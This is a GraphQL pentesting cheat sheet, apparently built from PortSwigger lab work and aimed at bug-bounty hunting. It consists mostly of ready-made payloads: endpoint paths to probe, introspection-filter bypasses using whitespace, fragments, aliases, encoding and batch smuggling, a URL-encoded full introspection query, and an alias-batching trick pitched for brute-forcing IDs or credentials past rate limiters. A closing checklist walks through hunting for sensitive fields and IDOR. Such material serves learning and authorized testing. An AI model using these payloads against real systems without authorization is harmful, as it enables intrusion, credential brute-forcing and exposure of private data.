# GraphQL Introspection Bypass Cheat Sheet

Reusable query templates for bypassing introspection filters on GraphQL endpoints.
All payloads assume GET-based delivery (`?query=...`) — adjust for POST/JSON body as needed.
Try templates in order within each section — most common/effective first.

---

## 0. Endpoint discovery

Try these paths if the endpoint isn't linked anywhere in the UI:
```
/graphql
/graphql/v1
/graphql/v2
/api
/api/graphql
/gql
/query
/graphiql
/v1/graphql
/v2/graphql
/api/v1/graphql
/console
/playground
```

**Signal to watch for:** a generic 404 means nothing is there. A GraphQL-specific error (e.g. `"Query not present"`, `"Must provide query string"`, `"Syntax Error"`) confirms a GraphQL handler exists at that path even before you've sent a valid query — treat that as "endpoint found," not "attempt failed."

---

## 1. Confirm it's live GraphQL

```graphql
query{__typename}
```
Expected: `{"data":{"__typename":"query"}}` (or `"Query"` — note the casing, it tells you the root type's actual name for later use).

---

## 2. Baseline introspection (try first, may just work)

```graphql
query{__schema{types{name}}}
```

If this succeeds outright — **stop, that's a finding on its own.** Introspection enabled in production is commonly a standalone submittable issue. Don't assume you need to chain further before reporting it.

If blocked, move to Section 3.

---

## 3. Introspection filter bypass techniques

Try in this order:

### A. Newline/whitespace injection (most common, try first)
```graphql
query{__schema
{types{name}}}
```
```graphql
query{__schema  {types{name}}}
```
```graphql
query{__schema	{types{name}}}
```
(tab character between `__schema` and `{`)

### B. Inline fragment wrapping
```graphql
query{...{__schema{types{name}}}}
```
```graphql
query{...F}fragment F on query{__schema{types{name}}}
```

### C. Field aliasing
```graphql
query{a:__schema{types{name}}}
```
```graphql
query{s:__schema{t:types{n:name}}}
```

### D. Case variation (cheap to try, often fails since GraphQL resolves field names case-sensitively, but filters sometimes aren't)
```graphql
query{__SCHEMA{types{name}}}
```
```graphql
Query{__schema{types{name}}}
```

### E. Encoding obfuscation
Double-encode or encode just the underscores in `__schema`:
```
query=query%7B%5F%5Fschema%7Btypes%7Bname%7D%7D%7D
```
(`%5F` = `_`)

### F. Delivery method switch
If filter only applies to GET or only to POST, switch:
- Try sending as `POST` with JSON body `{"query":"..."}` if GET is filtered
- Try sending as GET URL param if POST is filtered
- Try `Content-Type: application/graphql` with raw query as body

### G. Batched query smuggling
Some parsers treat a JSON array of query objects as a batch — filters checking only the first/top-level query sometimes miss ones buried in the batch:
```json
[{"query":"query{__typename}"},{"query":"query{__schema{types{name}}}"}]
```

---

## 4. Schema mapping — once introspection succeeds

Don't re-run the full heavy introspection repeatedly. Query specific pieces directly:

**List all type names:**
```graphql
query{__schema
{types{name}}}
```

**Get fields + args for an OBJECT type (query, mutation, or any named output type like `User`):**
```graphql
query{__type
(name:"query"){fields{name args{name}}}}
```
```graphql
query{__type
(name:"mutation"){fields{name args{name}}}}
```
```graphql
query{__type
(name:"User"){fields{name type{name}}}}
```

**Get fields for an INPUT type** (anything ending in `Input`, or any type used as a mutation argument) — use `inputFields`, NOT `fields`:
```graphql
query{__type
(name:"DeleteOrganizationUserInput"){inputFields{name type{name}}}}
```

> **Gotcha to remember:** querying a *field/mutation name* (e.g. `__type(name:"deleteOrganizationUser")`) returns `null` — `__type` only resolves actual type names, not field names. If you get `null`, check whether you queried a field instead of a type, or used `fields` when you needed `inputFields` (or vice versa).

**Full heavy introspection** (use only when you need everything — nested types, deprecation info, enums, interfaces). Take the standard introspection query and insert a newline after `__schema` before its brace:
```
query+IntrospectionQuery+%7B%0A++__schema%0A++%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
```

---

## 5. Rate-limit bypass via aliasing (bonus — separate PortSwigger lab topic, same schema family)

If a target rate-limits based on request count rather than field-resolution count, batch multiple operations into one request using aliases:
```graphql
query{
  a1:getUser(id:1){username}
  a2:getUser(id:2){username}
  a3:getUser(id:3){username}
  a4:getUser(id:4){username}
  a5:getUser(id:5){username}
}
```
One HTTP request, five lookups — useful for brute-forcing IDs/credentials past a naive per-request rate limiter.

---

## 6. URL-encoding reference (manual construction outside Burp's GraphQL tab)

| Character | Encoded |
|---|---|
| `{` | `%7B` |
| `}` | `%7D` |
| `(` | `%28` |
| `)` | `%29` |
| `"` | `%22` |
| space | `%20` or `+` |
| newline | `%0A` |
| `_` | `%5F` |
| `:` | `%3A` |

Burp's Repeater GraphQL tab auto-encodes when you type raw query text — hand-encoding is only needed for manual requests (browser address bar, curl, scripts).

---

## 7. Mental checklist for any new GraphQL target

1. Find the endpoint (common paths; check JS bundles for API routes; check network tab during normal site use). Watch for GraphQL-specific errors vs plain 404s as a discovery signal.
2. Confirm it's GraphQL (`{__typename}` probe).
3. Try baseline introspection — if it works outright, that's a submittable finding on its own.
4. If blocked, cycle through Section 3 bypass techniques (A → G).
5. Map `query` and `mutation` root fields first — that's your entry-point list.
6. For each sensitive-sounding field (password, token, role, price, ssn, email, internalNotes) found on a return type, trace which Query/Mutation entry returns or accepts that type.
7. For mutation arguments, remember object types use `fields`, input types use `inputFields` — check which one applies before concluding a type "doesn't exist."
8. Call the query/mutation directly, explicitly requesting the sensitive field — don't rely on what the frontend normally asks for.
9. Test across different user IDs/sessions to confirm IDOR vs single-object exposure.
10. If a valid finding is confirmed (cross-user data access, confirmed critical field exposure, broken authorization on a mutation) → submit immediately. Don't hold out for a bigger chain.

---

*Built from PortSwigger Web Security Academy GraphQL API vulnerabilities labs. Expand as new filter-bypass variants are encountered in the wild — not every WAF/filter uses the same logic.*
